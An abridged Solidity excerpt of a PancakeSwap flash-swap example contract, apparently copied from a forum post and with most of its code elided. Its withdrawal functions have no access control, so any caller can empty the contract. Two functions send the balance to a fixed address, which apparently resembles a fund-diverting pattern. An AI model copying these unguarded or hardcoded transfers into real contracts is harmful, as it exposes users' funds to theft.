...
// code  from: https://forum.eattheblocks.com/t/pancakeswap-flashloan/764/3
...
interface IPancakePair {
    ...
    contract UniswapFlashSwapper {
        ...
        // CONSTANTS
        // UniswapV2Factory on kovan:            0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
        // pancakeSwap factory on BSC testnet :  0x6725F303b657a9451d8BA641348b6761A6CC7a17
        
        IPancakeFactory constant uniswapV2Factory = IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f); 
...
contract ExampleContract is UniswapFlashSwapper {
    ...
    function sendMeEther() external {
        
        
        msg.sender.transfer(address(this).balance);
    }
    
    function sendMeErc20(address token_adr) external {
        
        
        erc20_token(token_adr).transfer(msg.sender, getBalanceOf(token_adr));
    }
    ...
    function flashSwap(address _tokenBorrow, uint256 _amount, address _tokenPay) external {
        ...
        startSwap(_tokenBorrow, _amount, _tokenPay, bytes('not empty'));
    ...
    function cixar() public {
        ...
        // send all ether from this contract to oz
        oz.transfer(address(this).balance);

    } 
    
    function erc20_ssend(uint256 _val,address token_adr) public{
        // 0x2d259703D878825C4323B13420C4d3c599b1E399 is the recipient address
